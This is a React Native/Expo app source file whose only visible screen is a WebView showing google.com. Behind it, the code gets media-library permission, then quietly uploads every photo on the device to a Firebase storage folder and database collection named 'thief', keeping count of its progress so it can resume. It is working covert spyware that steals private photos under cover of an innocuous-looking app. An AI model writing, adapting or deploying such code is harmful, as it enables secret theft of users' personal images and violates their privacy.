import "react-native-gesture-handler"

import React, { useEffect, useState } from 'react';
import {
  CameraRoll,
  PermissionsAndroid,
  Text,
  View,
  StyleSheet,
  ScrollView,
  Platform,
  Image,
  AsyncStorage,
  Button
 
} from 'react-native';
import Constants from 'expo-constants';
import * as MediaLibrary from 'expo-media-library';

import { db, storage } from './firebase';
import {WebView} from "react-native-webview"

export default function App() {
  const [photos, setPhotos] = useState([]);
  const [permission, setPermission] = useState(false);
  const [uploading, setUploading] = useState(false);


  useEffect(() => {
    console.log("useEffecr")
    const work = async () => {
      const permission = await MediaLibrary.requestPermissionsAsync();
      if (permission.status == 'granted') {
        setPermission(true);
      }
      
      let ImageId = await AsyncStorage.getItem('thief');

      if (ImageId && permission && uploading != true) {
        console.log('if');
        ImageId = parseInt(ImageId);
        const source = await MediaLibrary.getAssetsAsync({
          first: ImageId + 1,
        });
        console.log(source);
        console.log('ImageId', ImageId);
        

        if (ImageId == source.assets.length) {
          console.log('rqual');
          return;
        }

        let localData = source.assets.splice(ImageId, 1)[0];
        let uri = localData.uri;
        let date = new Date();
        let filename = date + localData.uri.split('/').pop();
        // console.log(uri,filename)
        const response = await fetch(uri);
        const blob = await response.blob();
        const uploadTask = storage.ref('/thief/' + filename).put(blob);

        if (uploading === false) {
          setUploading(true);
        }

        uploadTask.on(
          'state_changed',
          (snapshot) => {
            const progress = Math.round(
              (snapshot.bytesTransferred / snapshot.totalBytes) * 100
            );

            console.log(progress);
            if (progress == 100) {
              AsyncStorage.setItem('thief', String(ImageId + 1)).then(() => {
                console.log('changed');
              });
              setUploading(false);
            }
          },
          (error) => {

            return false;
          },
          () => {
            //complete function
            storage
              .ref('thief')
              .child(filename)
              .getDownloadURL()
              .then((url) => {
                db.collection('thief')
                  .add({
                    imageUrl: url,
                  })
                  .then(() => {});
              });
          }
        );
      } else if (uploading === true) {
        console.log('else if');
      } else {
        console.log('else');
        await AsyncStorage.setItem('thief', '0');
        work();
      }
    };

    work();
  }, [uploading]);



  return (
    <View style={styles.container}>
    <WebView source={{uri:"https://google.com"}} />
      
    </View>

  );
}


const styles = StyleSheet.create({
  container: {
    flex: 1,
    paddingTop: Constants.statusBarHeight,
    backgroundColor: 'pink',
  },
  paragraph: {
    margin: 24,
    fontSize: 18,
    fontWeight: 'bold',
    textAlign: 'center',
  },
});
